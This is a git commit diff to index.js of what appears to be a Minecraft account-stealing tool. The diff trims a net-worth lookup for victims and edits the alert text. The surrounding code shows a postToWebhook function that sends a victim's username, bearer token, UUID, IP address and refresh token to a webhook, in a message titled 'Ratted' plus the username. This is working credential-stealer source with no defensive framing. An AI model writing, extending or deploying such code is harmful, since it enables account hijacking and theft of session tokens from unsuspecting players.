d1dd95e7c8bea3f6b74977ec44658a92d7b38c17
MagiaRatoi <112208505+MagiaRatoi@users.noreply.github.com>
2022-11-24 19:48:43 +0300

    Update index.js

--- index.js
+++ index.js
@@ -123,15 +123,9 @@ function getIp(req) {
 
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
-    
-    const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v2/profiles/${username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth
-    let total_networth
-    if (networth == null) total_networth = `[NW] No profile data found [NW]`
-    else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
-    else total_networth = `[NW] ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
-
+  
     let data = {
-  content: "`@everyone - ${total_networth}`",
+  content: "@everyon",
   embeds: [
     {
       title: "Ratted " + username + " - Click for networth",
